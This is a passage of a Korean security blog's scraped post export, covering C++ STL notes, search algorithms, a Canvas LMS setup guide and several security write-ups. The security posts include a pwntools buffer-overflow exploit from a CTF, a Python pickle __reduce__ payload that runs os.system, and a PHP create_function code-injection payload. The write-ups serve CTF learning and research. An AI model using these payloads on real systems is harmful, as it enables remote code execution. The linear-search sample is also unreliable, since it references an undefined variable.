반환|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환 set 삽입, 삭제|Name|Context|s1.insert()| s1에 원소 삽입|s1.erase()| s1에 저장된 원소 삭제(지우기)|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)|s1.clear()| s1에 저장된 원소 모두 삭제|s.emplace()| move()를 사용해서 객체 저장|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입 set의 기능|Name|Context|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)|s1.count()| s1에 저장된 요소 개수 반환|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환|s1.equal_range()| 지정 요소에 대한 iterator 반환 set 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;set&gt; using namespace std; int main(void)&#123; set&lt;int&gt; s1; set&lt;int&gt;::iterator iter; s1.insert(1); s1.insert(2); s1.insert(3); for(iter = s1.begin(); iter != s1.end(); iter++)&#123; // iterator cout &lt;&lt; *iter &lt;&lt; endl; &#125; cout &lt;&lt; (s1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // s1 empty check(true/false) cout &lt;&lt; s1.size() &lt;&lt; &quot;\\n&quot;; // size 반환(result : 3) cout &lt;&lt; s1.max_size() &lt;&lt; &quot;\\n&quot;; // 최대 size 반환 s1.erase(3); // s1의 원소 3 지우기 set&lt;int&gt;::iterator iter2 = s1.find(2); // s1에서 2의 값을 검색 if(iter2 == s1.end())&#123; // 조건문 시작 만약 find해서 결과를 못찾았다면? cout &lt;&lt; &quot;not found..&quot; &lt;&lt; endl; // not found &#125;else&#123; // 결과가 있다면? cout &lt;&lt; &quot;found!!&quot; &lt;&lt; endl; // found &#125; s1.clear(); // s1의 모든 원소 지우기 &#125; mapmap은 set과 같이 associative container의 종류로 노드 기반으로 이루어진 균형 이진 트리 구조이다. map은 key, value로 이루어져 있고 pair 객체 형태로 저장된다. key는 중복이 불가능(multimap에서는 사용이 가능하다)하며, set과 동일하게 원소가 삽입되면서 자동으로 오름차순 정렬이 된다. map은 저장 공간의 필요에 따라서 allocator(동적 할당) 객체를 사용한다. map 선언#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;map&gt; using namespace std; map&lt;string, int&gt; m1; map 반복자(iterator)|Name|Context|s1.begin()| 첫번째 원소를 가리킨다.|s1.end()| 마지막 원소를 가리킨다.|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 첫번째)|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)|s1.cbegin()| begin과 동일하나 const로 선언|s1.cend()| end과 동일하나 const로 선언|s1.crbegin()| rbegin과 동일하나 const로 선언|s1.crend()| rend와 동일하나 const로 선언 map 용량, 크기(size, capacity)|Name|Context|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환|s1.size()| s1의 size(원소 갯수) 반환|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환 map 삽입, 삭제|Name|Context|s1.insert()| s1에 원소 삽입|s1.erase()| s1에 저장된 원소 삭제(지우기)|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)|s1.clear()| s1에 저장된 원소 모두 삭제|s.emplace()| move()를 사용해서 객체 저장|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입 map의 기능|Name|Context|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)|s1.count()| s1에 저장된 요소 개수 반환|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환|s1.equal_range()| 지정 요소에 대한 iterator 반환 map 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;map&gt; using namespace std; int main(void)&#123; map&lt;string, int&gt; m1; map&lt;string, int&gt;::iterator it; m1.insert(make_pair(&quot;key&quot;, 1)); // map에 key,value 삽입(make_pair 사용) m1.insert(make_pair(&quot;key2&quot;, 2)); m1.insert(make_pair(&quot;key3&quot;, 3)); cout &lt;&lt; (m1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // map이 비어있는지 검사 cout &lt;&lt; m1.count(&quot;key1&quot;) &lt;&lt; &quot;\\n&quot;; // 카운트 반환 1 or 0 cout &lt;&lt; m1.count(&quot;key2&quot;) &lt;&lt; &quot;\\n&quot;; // 카운트 반환 1 or 0 cout &lt;&lt; m1.find(&quot;key1&quot;)-&gt;second &lt;&lt; &quot;\\n&quot;; // key1 검색 map&lt;string, int&gt;::iterator iter = m1.find(&quot;key4&quot;); // iterator key search if(iter == m1.end())&#123; // key를 못찾아서 end 반환했을 때 cout &lt;&lt; &quot;key not found&quot; &lt;&lt; &quot;\\n&quot;; &#125; for(it = m1.begin(); it != m1.end(); it++)&#123; // iterator 접근 cout &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; endl; &#125; &#125; map은 set과 사용하는 멤버 함수가 동일하다. unordered_setset과 거의 동일하지만 unordered_set은 원소를 삽입할 때 정렬하지 않는 컨테이너이고, set은 이진 탐색 트리의 구조지만 unordered_set은 해쉬 테이블의 구조를 가지고 있다. unordered_set 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;unordered_set&gt; using namespace std; int main(void)&#123; unordered_set&lt;int&gt; us1; // 생성자 선언 unordered_set&lt;int&gt;::iterator it; // iterator 선언 us1.insert(1); // us1(set)에 원소 삽입 us1.insert(2); us1.insert(3); us1.insert(4); for(it = us1.begin(); it != us1.end(); it++)&#123; //iterator 반복자 cout &lt;&lt; *it &lt;&lt; endl; // 출력 &#125; &#125; unordered_mapunordered_map 역시 map과 사용하는 방법은 동일하기 때문에 둘 중 어느것을 쓰던 문제가 없다. 다만 차이점이라면 set, unordered_set과 같이 이진 탐색 트리와 해쉬 테이블의 차이점을 가지고 있다. 속도가 빨라야 한다면 unordered_map를 사용하는 것도 권장할 수 있다. 하지만 데이터가 많아진다면 unordered_map 역시 속도가 느리다고 할 수 있는데, 결국 데이터가 적다면 unordered_map이 속도면에서는 유리하고 데이터가 많다면 map이 좋다. unordered_map 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;unordered_map&gt; using namespace std; int main(void)&#123; unordered_map&lt;string, int&gt; um1; // 생성자 unordered_map&lt;string, int&gt;::iterator it; um1.insert(make_pair(&quot;key1&quot;, 1)); // map에 원소 삽입(make_pair(key, value)) um1.insert(make_pair(&quot;key2&quot;, 2)); for(it = um1.begin(); it != um1.end(); it++)&#123; // iterator 반복문 cout &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; endl; &#125; cout &lt;&lt; um1.find(&quot;key1&quot;)-&gt;second &lt;&lt; &quot;\\n&quot;; // key find cout &lt;&lt; (um1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // map(um1)이 비어있는지 체크하고 true/false 반환 &#125; References https://modoocode.com/ https://blockdmask.tistory.com/76 https://blockdmask.tistory.com/70 https://hwan-shell.tistory.com/130 https://blankspace-dev.tistory.com/347 https://twpower.github.io/91-how-to-use-map-in-cpp","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://blog.jhyeon.dev/tags/C/"},{"name":"STL","slug":"STL","permalink":"https://blog.jhyeon.dev/tags/STL/"}]},{"title":"탐색 알고리즘(선형, 이진) 정리","slug":"search-algorithm-200910","date":"2020-09-09T15:00:00.000Z","updated":"2021-01-17T09:38:00.496Z","comments":true,"path":"2020/09/10/search-algorithm-200910/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/10/search-algorithm-200910/","excerpt":"","text":"탐색 알고리즘 종류1. 선형 탐색법 (리니어 서치) 왼쪽부터 순서대로 하나씩 확인해 나가는 방법 (한쪽 끝에서 다른 한쪽 끝으로 나아가는 방법) 탐색 시작 → 결과를 탐색할 때까지 반복문 실행 → 결과값 반환 후 종료 #!/usr/bin/python3 def search(array, target): i = 0 while i &lt; len(array): if arr[i] == target: return i i += 1 return &quot;error&quot; array = [1,2,3,5,7,8,9] # index 0~6 target = 9 print(search(array,target)) #result 6 2. 이진 알고리즘 탐색(binary) 정렬된 리스트(배열) 에서 원하는 수(target) 값을 찾는 알고리즘 입니다. 선형 알고리즘 탐색 방법과 다르게 “이진 알고리즘” 탐색은 리스트가 정렬되어 있어야 한다는 점입니다. 배열의 전체의 중간 값(middle) 을 비교 합니다. 중간 값(middle) 이 원하는 수(target) 값보다 작다면 왼쪽, 크다면 오른쪽을 선택하여 탐색을 시작합니다. 선택된 방향에서 중간 값(middle) 과 원하는 수(target) 을 비교해서 같다면 탐색을 종료합니다. #coding=UTF-8 def binarysearch(array, target, left, right): middle_idx = (left+right)//2 # 중간 지점 탐색 print(middle_idx) middle = array[middle_idx] # Array 배열 적용 if target == middle: # 탐색 값과 중간 값이 같다면 print(&#39;result : &#123;&#125;&#39;.format(middle)) # 결과 리턴 elif middle &gt; target: # 탐색 값이 중간 값 보다 크다면 binarysearch(array, target, left, middle_idx-1) # 함수실행 elif middle &lt; target: # 탐색 값이 중간 값 보다 작다면 binarysearch(array, target, middle_idx+1, right) # 함수실행 else: return False # 위 경우 모두 만족하지 않을 때 false 반환 array = [1,2,3,5,7,11,13,9,17,15,19,21] length = len(array) print(&quot;length : &#123;&#125;&quot;.format(length)) array.sort() print(&quot;sort : &#123;&#125;&quot;.format(array)) target = 15 left = 0 right = length-1 binarysearch(array, target, 0, right) References https://velog.io/@keemun/1 https://velog.io/@madfinger/Binary-Search이진-탐색-파이썬","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://blog.jhyeon.dev/tags/Algorithm/"},{"name":"선형 탐색","slug":"선형-탐색","permalink":"https://blog.jhyeon.dev/tags/%EC%84%A0%ED%98%95-%ED%83%90%EC%83%89/"},{"name":"이진 탐색","slug":"이진-탐색","permalink":"https://blog.jhyeon.dev/tags/%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89/"}]},{"title":"SSTF 2020 BOF 101 Write up","slug":"sstf-200818","date":"2020-08-17T15:00:00.000Z","updated":"2021-01-17T09:27:36.566Z","comments":true,"path":"2020/08/18/sstf-200818/","link":"","permalink":"https://blog.jhyeon.dev/2020/08/18/sstf-200818/","excerpt":"","text":"우선 file 명령어와 checksec을 사용해서 바이너리 컴파일 정보와, Memory Mitigation을 확인 해보자. 사진과 같이 x64 dynamic linked binary임을 알 수 있고, FULL RELRO, NX, PIE가 활성화 되어 있는 것을 알 수 있다. IDA로 바이너리 분석을 해보면 main() 함수의 동작 로직은 다음과 같다. 바이너리가 실행되면 scanf 함수를 통해 사용자에게 입력받는 로직이고, 0xdeadbeef 값을 세팅하고 있어 BOF를 통해 해당 메모리 영역을 덮어버리면 BOF Detected!! 가 발생한다. 그럼 시나리오는 다음과 같이 생각해볼 수 있다. 입력 받는 메모리 공간은 rbp-0x90(144) 만큼을 받고 있으니, 140만큼 써주고 체크 로직을 통과하기 위해 나머지 4byte 값을 0xdeadbeef 로 만들어 준다음, RSP를 8byte dummy로 채우고 RET 에서 printflag() 함수로 리턴 시켜준다면 플래그를 획득할 수 있는 구조가 된다. 32비트 환경에서 컴파일 된 바이너리는 SFP(4byte) + RET(4byte)를 가지지만, 64비트 환경에서 컴파일 된 바이너리는 RSP(8byte) + RET(6byte)의 값을 가지는 것을 고려해주면 된다. 1 #!/usr/bin/python3 2 3 from pwn import * 4 5 #p = process(&#39;./bof101&#39;) 6 7 p = remote(&#39;bof101.sstf.site&#39;,1337) 8 9 e = ELF(&#39;./bof101&#39;) 10 11 p.recvuntil(&#39;addr:&#39;) 12 13 flag_addr = int(p.recv(15),16) 14 15 p.recvline() 16 17 print(hex(flag_addr)) 18 19 payload = &quot;A&quot;*140 20 payload += p32(0xdeadbeef) 21 payload += &quot;A&quot;*8 22 payload += p64(flag_addr) 23 24 p.sendlineafter(&#39;: &#39;,payload) 25 26 p.interactive() SCTF&#123;n0w_U_R_B0F_3xpEr7&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"BOF","slug":"BOF","permalink":"https://blog.jhyeon.dev/tags/BOF/"}]},{"title":"canvas lms installation","slug":"canvas-install-200627","date":"2020-06-26T15:00:00.000Z","updated":"2021-01-17T09:29:21.026Z","comments":true,"path":"2020/06/27/canvas-install-200627/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/27/canvas-install-200627/","excerpt":"","text":"OSOS : Ubuntu 16.04 Desktop(http://old-releases.ubuntu.com/releases/16.04.4/) Canvas LMS - Open Source : https://github.com/instructure/canvas-lms 설치postgresql 설치$ sudo apt-get install postgresql-9.5 관리자 계정 생성adduser sysadmin sysadmin 계정에 대한 Root 권한 부여visudo → User Privileges → sysadmin ALL=(ALL:ALL) ALL sysadmin 계정으로 사용자 변경su sysadmin postgres 설정sudo -u postgres createuser canvas --no-createdb \\ --no-superuser --no-createrole --pwprompt sudo -u postgres createdb canvas_production --owner=canvas git 설정sudo apt-get install git-core git clone https://github.com/instructure/canvas-lms.git canvas cd canvas git checkout stable installation(1)sudo mkdir -p /var/canvas sudo chown -R sysadmin /var/canvas $(canvas) cp -av . /var/canvas Dependencysudo apt-get install software-properties-common sudo add-apt-repository ppa:brightbox/ruby-ng sudo apt-get update ruby2.4 installsudo apt-get install ruby2.4 ruby2.4-dev zlib1g-dev libxml2-dev \\ libsqlite3-dev postgresql libpq-dev \\ libxmlsec1-dev curl make g++ node.js installcurl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash - sudo apt-get install nodejs set sysadmin postgres superuser$ sudo -u postgres createuser $USER $ sudo -u postgres psql -c &quot;alter user $USER with superuser&quot; postgres bundler and canvas dependencies$ sudo gem install bundler --version 1.13.7 $ bundle _1.13.7_ install --path vendor/bundle yarn installation$ curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - $ echo &quot;deb https://dl.yarnpkg.com/debian/ stable main&quot; | sudo tee /etc/apt/sources.list.d/yarn.list $ sudo apt-get update &amp;&amp; sudo apt-get install yarn=1.10.1-1 $ sudo apt-get install python $ yarn install canvas default config$ for config in amazon_s3 database \\ delayed_jobs domain file_store outgoing_mail security external_migration; \\ do cp config/$config.yml.example config/$config.yml; done dynamic setting$ cp config/dynamic_settings.yml.example config/dynamic_settings.yml $ (check) nano config/dynamic_settings.yml (vi로 진행해도 상관 없음) database setting$ cp config/database.yml.example config/database.yml $ (check) nano config/database.yml (vi로 진행해도 상관 없음) # do not create a queue: section for your test environment test: adapter: postgresql encoding: utf8 database: canvas_test host: localhost username: canvas timeout: 5000 development: adapter: postgresql encoding: utf8 database: canvas_development timeout: 5000 production: adapter: postgresql encoding: utf8 database: canvas_production host: localhost username: canvas password: your_password timeout: 5000 outgoing mail config$ cp config/outgoing_mail.yml.example config/outgoing_mail.yml $ (check) nano config/outgoing_mail.yml (vi로 진행해도 상관 없음) url config$ cp config/domain.yml.example config/domain.yml $ (check) nano config/domain.yml (vi로 진행해도 상관 없음) production: domain: &quot;canvas.jhyeon.xyz&quot; # whether this instance of canvas is served over ssl (https) or not # defaults to true for production, false for test/development ssl: false # files_domain: &quot;canvasfiles.example.com&quot; security config$ cp config/security.yml.example config/security.yml $ nano config/security.yml (vi로 진행해도 상관 없음) production: &amp;default # replace this with a random string of at least 20 characters encryption_key: 12345123451234512345 lti_iss: &#39;https://canvas.instructure.com&#39; generate assets$ (/var/canvas) mkdir -p log tmp/pids public/assets app/stylesheets/brandable_css_brands $ (/var/canvas) touch app/stylesheets/_brandable_variables_defaults_autogenerated.scss $ (/var/canvas) touch Gemfile.lock $ (/var/canvas) touch log/production.log $ (/var/canvas) sudo adduser --disabled-password --gecos canvas canvasuser $ (/var/canvas) sudo chown -R canvasuser config/environment.rb log tmp public/assets \\ app/stylesheets/_brandable_variables_defaults_autogenerated.scss \\ app/stylesheets/brandable_css_brands Gemfile.lock config.ru $ (/var/canvas) yarn install $ (/var/canvas) RAILS_ENV=production bundle exec rake canvas:compile_assets $ (/var/canvas) sudo chown -R canvasuser public/dist/brandable_css $ (/var/canvas) RAILS_ENV=production bundle exec rake brand_configs:generate_and_upload_all * VM 메모리 최소 8GB 메모리 구성 필요합니다. database populationRAILS_ENV=production bundle exec rake db:initial_setup apache2 installation$ sudo apt-get install passenger libapache2-mod-passenger apache2 $ sudo a2enmod rewrite $ sudo a2enmod passenger $ sudo a2enmod ssl $ sudo unlink /etc/apache2/sites-enabled/000-default.conf 아래 단계 완료 후 수행 $ sudo a2ensite canvas &lt;VirtualHost *:80&gt; ServerName canvas.jhyeon.xyz ServerAlias canvasfiles.canvas.jhyeon.xyz ServerAdmin admin@canvas.jhyeon.xyz DocumentRoot /var/canvas/public ErrorLog /var/log/apache2/canvas_errors.log LogLevel warn CustomLog /var/log/apache2/canvas_access.log combined SetEnv RAILS_ENV production &lt;Directory /var/canvas/public&gt; Options All AllowOverride All Require all granted Options -MultiViews &lt;/Directory&gt; &lt;/VirtualHost&gt; cache config$ sudo add-apt-repository ppa:chris-lea/redis-server $ sudo apt-get update $ sudo apt-get install redis-server $ sudo cp config/cache_store.yml.example config/cache_store.yml $ sudo vi config/cache_store.yml test: cache_store: redis_store development: cache_store: redis_store production: cache_store: redis_store $ sudo chown canvasuser config/cache_store.yml $ sudo cp config/redis.yml.example config/redis.yml $ sudo vi config/redis.yml production: servers: - redis://localhost $ sudo chown canvasuser config/redis.yml start server$ sudo ln -s /var/canvas/script/canvas_init /etc/init.d/canvas_init $ sudo update-rc.d canvas_init defaults $ sudo /etc/init.d/canvas_init start $ sudo /etc/init.d/apache2 restart 참고 https://github.com/instructure/canvas-lms/wiki/Production-Start https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"CANVAS","slug":"CANVAS","permalink":"https://blog.jhyeon.dev/tags/CANVAS/"},{"name":"LMS","slug":"LMS","permalink":"https://blog.jhyeon.dev/tags/LMS/"}]},{"title":"동아리 워게임 홍보(?)","slug":"bangsiri-wargame-200619","date":"2020-06-18T15:00:00.000Z","updated":"2021-01-17T09:18:19.402Z","comments":true,"path":"2020/06/19/bangsiri-wargame-200619/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/19/bangsiri-wargame-200619/","excerpt":"","text":"올해 3월을 끝으로 기존 CTFd 에서 운영하던 동아리 학습용 CTF 서버를 자체 플랫폼으로 이전 하였습니당, 문제도 기존과 다르게 모의 해킹 분야별로 많이 업데이트 할 예정이고, 동아리 원이 아니더라도 문제 풀어보실 수 있으니 많이 이용 해주세요! https://wargame.hacking.one/","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"B@ngsiri","slug":"B-ngsiri","permalink":"https://blog.jhyeon.dev/tags/B-ngsiri/"}]},{"title":"Python Pickle Library Vulnability","slug":"python-pickle-200616","date":"2020-06-15T15:00:00.000Z","updated":"2021-03-07T17:22:07.279Z","comments":true,"path":"2020/06/16/python-pickle-200616/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/16/python-pickle-200616/","excerpt":"","text":"Python PicklePython Pickle은 직렬화(Pickling) , 역직렬화(UnPickling) 을 지원하는 모듈 입니다. Vuln해당 모듈은 공식 문서에서도 사용을 권장하지 않습니다, 데이터를 역직렬화(UnPickling) 할 때, 임의의 코드를 실행하는 등의 악의적인 데이터로 구성하여 RCE(Remote Control Exexecution) 등의 공격이 가능하게 됩니다. object.__getnewargs_ex__() object.__getnewargs__() object.__getstate__() object.__setstate__(state) object.__reduce__() object.__reduce_ex__(protocol) reduce() 메서드는 아무런 인자도 받지 않지만, 튜플을 반환할 때 함수를 반환하는 것이 가능합니다. [pickling.py] import os import cPickle import sys import base64 cmd = &#39;id&#39; class Exploit(object): def __reduce__(self): return (os.system, (cmd,)) shellcode = cPickle.dumps(Exploit()) print base64.b64encode(shellcode) [ex.py] import os import cPickle import sys import base64 data = raw_input(&quot;&quot;) print cPickle.loads(base64.b64decode(data)) References https://docs.python.org/ko/3/library/pickle.html#data-stream-format https://github.com/JHye0n/Web-CTF-Cheatsheet","categories":[{"name":"Research","slug":"Research","permalink":"https://blog.jhyeon.dev/categories/Research/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.jhyeon.dev/tags/Python/"},{"name":"RCE","slug":"RCE","permalink":"https://blog.jhyeon.dev/tags/RCE/"},{"name":"Python Pickle","slug":"Python-Pickle","permalink":"https://blog.jhyeon.dev/tags/Python-Pickle/"},{"name":"Vulnability","slug":"Vulnability","permalink":"https://blog.jhyeon.dev/tags/Vulnability/"}]},{"title":"S/W 소프트웨어 개발 프로세스 모델","slug":"swmodel-200613","date":"2020-06-12T15:00:00.000Z","updated":"2021-01-17T09:29:36.561Z","comments":true,"path":"2020/06/13/swmodel-200613/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/13/swmodel-200613/","excerpt":"","text":"개발 프로세스와 관련해서 여러 많은 자료를 찾아 보고 개인 공부 겸 정리 하였습니다. 이론 부분에 있어서도 한 두가지가 아니다보니 많이 헷갈리는데 앞으로 더 꾸준히 공부해야 겠네요.. 해당 내용은 아래 노션에 작성되어 있습니다. https://www.notion.so/jhyeon/S-W-ed3a6d56bb2f42c199e93a15ceb35342","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://blog.jhyeon.dev/tags/Algorithm/"}]},{"title":"동아리 온라인 시험 플랫폼 개발 후기","slug":"exam-platformdev-200612","date":"2020-06-11T15:00:00.000Z","updated":"2021-01-17T09:12:42.708Z","comments":true,"path":"2020/06/12/exam-platformdev-200612/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/12/exam-platformdev-200612/","excerpt":"","text":"간단, 계기요즘 코로나19 영향 때문에 학교는 물론 동아리 운영도 쉽지 않다. 이번 동아리 신입생 선발 시험에 관련해서 임원진들과 몇가지 생각해본 것이 있는데 오프라인으로 진행하기에는 사실 장소 대여도 쉽지 않아서 여러 방안을 생각해보다가 온라인으로 시험을 진행하기로 했는데 이 방법 역시 쉬운 방법만은 아니였다. 이유는 시험에 대한 감독을 진행할 수 없다는 점(부정 행위)에 대한 문제점이 가장 크게 작용하였는데, 제출 확인을 할 때 출제자 들이 조금 더 엄격하게 체크해야 하는 쪽이 제일 최선의 방법인 것 같았다. 또한 C/Python 마다 속해있는 인원이 달라 문제 배포에 대해서도 문제점이 있었는데, 이 부분은 내가 웹 개발을 해주겠다고 해서 문제가 일단 해결되었다. 개발 과정시험은 오는 6월 18일에 진행을 예정하고 있다. 사실 BoB 준비도 그렇고 다른 일때문에 바쁘다 보니 5월 말이나 되서야 개발을 시작하게 되었는데 오늘 날짜로 한 2주 살짝 넘게 작업을 했었고, 교내 동아리 서버를 이용해서 도커로 웹 서버를 구축하고 기능을 하나씩 만들어 갔던 기억이 있다. 사실 단순하게 운영에 꼭 필요한 기능들만 생각하고 개발을 했는데 시큐어 코딩을 계속 적용해야 하다보니 생각해야할 부분이 많았다. 또한, 개발하면서 임원진들이 개선 요청이 자주 있었을뿐더러 테스트를 할 때 예상과 다르게 작동되는 기능이 몇가지 있어서 계속 수정 하면서 릴리즈 했던 기억이 있다.. 주요 기능 로그인 회원가입 코드 컴파일러 시험 문제 풀이 제출 [로그인] &amp; [회원가입] : 신입생(회원) 여부를 체크하기 위한 목적 [코드컴파일러] : 문제를 보고 자신이 작성한 코드가 정상적으로 작동되는지를 보기 위한 컴파일러이다. (Sphere Engine API) [시험문제] : 회원가입 때 본인이 응시하겠다고 하는 분야를 바탕으로 (공통 분야/선택한 분야) 를 포함하여 문제가 공개된다. [제출] : 제출할 때 편의성(?) 을 조금 더 높히고자 파일을 업로드 받아 메일 서버를 통해서 동아리 관리 계정으로 이메일이 발송되도록 구현 했다. 개인적인 생각혼자서 웹 하나를 구축해 나가면서 생각지도 못한 부분에서 취약점도 있었고, 로직 버그도 1~2개씩 있었던 것 같다. 그리고 대부분 DB 서버로 연동해서 자동화 처리를 수행했는데 시험 페이지쪽에 시간을 설정하는 쪽에는 아직 수동으로 구축되어 있다. 이 부분은 아마 이번 주말내에 관리 모듈에서 연동할 수 있도록 해서 추가할 예정중에 있다. 그리고 기능에 대해서도 자체적으로 구현하면 좋을 수 있는 것들이 많았지만 시간적인 문제도 있었기에 모든 부분을 다 구현하지는 못했다. 하나의 웹을 만들어 나가면서 부족한 점도 많이 느낄 수 있었던 부분인 것 같다. 오픈 소스https://github.com/JHye0n/bangsiri_online_exam","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"Development","slug":"Development","permalink":"https://blog.jhyeon.dev/tags/Development/"}]},{"title":"워게임 사이트 추천","slug":"wargame-list-200603","date":"2020-06-02T15:00:00.000Z","updated":"2021-01-17T09:10:16.741Z","comments":true,"path":"2020/06/03/wargame-list-200603/","link":"","permalink":"https://blog.jhyeon.dev/2020/06/03/wargame-list-200603/","excerpt":"","text":"해당 자료는 아래 노션에 작성되어 있습니다. https://www.notion.so/jhyeon/43ce112d299d42e0be73e5da5d9be39a","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/tags/Wargame/"}]},{"title":"Browser Auditor 기술 발표 자료","slug":"browser-auditor-200526","date":"2020-05-25T15:00:00.000Z","updated":"2021-01-17T09:07:30.893Z","comments":true,"path":"2020/05/26/browser-auditor-200526/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/26/browser-auditor-200526/","excerpt":"","text":"발표자료2019년 11월에 있었던 KUCIS 서경강권역 학술 세미나에서 발표 자료로 썼던 내용 입니다. 자료 다운로드 : https://drive.google.com/open?id=1mWcSwYwmdUHYZDLgb7szeHc7gbczpcpc","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Browser Auditor","slug":"Browser-Auditor","permalink":"https://blog.jhyeon.dev/tags/Browser-Auditor/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://blog.jhyeon.dev/tags/CSRF/"},{"name":"Chrome","slug":"Chrome","permalink":"https://blog.jhyeon.dev/tags/Chrome/"},{"name":"Firefox","slug":"Firefox","permalink":"https://blog.jhyeon.dev/tags/Firefox/"}]},{"title":"문서형 악성코드 분석 발표 자료(Malware Analyze)","slug":"malware-analyze-200526","date":"2020-05-25T15:00:00.000Z","updated":"2021-01-17T09:08:38.395Z","comments":true,"path":"2020/05/26/malware-analyze-200526/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/26/malware-analyze-200526/","excerpt":"","text":"발표자료2019년 8월에 있었던 KUCIS 영남권역 학술 세미나에서 발표 자료로 썼던 내용 입니다. 악성코드 개념, 종류, 사례 그리고 실제 악성코드 분석 결과 등에 대한 내용을 작성 하였습니다. 자료 다운로드 : https://drive.google.com/open?id=1gVxnWzPI8sX9k5yI-gG5L31Mx9wUKm68","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Malware","slug":"Malware","permalink":"https://blog.jhyeon.dev/tags/Malware/"},{"name":"Macro","slug":"Macro","permalink":"https://blog.jhyeon.dev/tags/Macro/"}]},{"title":"create_function() RCE 취약점 정리","slug":"function-rce-200515","date":"2020-05-14T15:00:00.000Z","updated":"2021-01-17T09:04:39.188Z","comments":true,"path":"2020/05/15/function-rce-200515/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/15/function-rce-200515/","excerpt":"","text":"개요create_function 함수는, php.net(https://www.php.net/manual/en/function.create-function.php) 에 정의된 내용으로, 매개변수를 전달받아 익명 함수를 생성하는 함수 입니다. 함수 정의해당 함수는 아래와 같이 사용할 수 있습니다. create_function ( string $args , string $code ) : string 함수 취약점 분석하지만, 함수를 잘못된 방법으로 사용할 시 RCE 취약점이 발생하게 되는데 예시는 다음과 같습니다. create_function(string $args, $_POST[&#39;code&#39;]); 위와 같은 방법으로 사용할 시에 두번째 인자에 임의적인 값을 주입하여 원하는 코드를 실행시킬 수 있습니다. return -1;&#125; phpinfo(); /*","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://blog.jhyeon.dev/tags/RCE/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.jhyeon.dev/tags/PHP/"}]},{"title":"websec.fr babysteps Write up","slug":"websecbaby-200514","date":"2020-05-13T15:00:00.000Z","updated":"2021-01-17T08:59:01.088Z","comments":true,"path":"2020/05/14/websecbaby-200514/","link":"","permalink":"https://blog.jhyeon.dev/2020/05/14/websecbaby-200514/","excerpt":"","text":"1. LEVEL-1class LevelOne &#123; public function doQuery($injection) &#123; $pdo = new SQLite3(&#39;database.db&#39;, SQLITE3_OPEN_READONLY); $query = &#39;SELECT id,username FROM users WHERE id=&#39; . $injection . &#39; LIMIT 1&#39;; $getUsers = 